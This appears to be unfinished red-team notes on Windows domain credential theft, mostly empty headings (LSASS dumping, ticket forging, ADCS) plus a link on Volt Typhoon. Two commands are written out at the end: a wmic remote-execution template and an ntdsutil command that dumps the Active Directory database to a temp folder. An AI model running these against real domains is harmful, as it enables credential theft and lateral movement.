# Advanced Credential Grabbing



## LSASS Dump Through Comsvc.dll

use nim custom .dll inject

## Total Not Mimikatz Ticket Generation


## ADCS


## Create Domain Save with 
https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/


`wmic /node: /user: /password: process call create`

`ntdsutil \"ac i ntds\" ifm \"create full c:\Windows\temp\pew\" qq"`
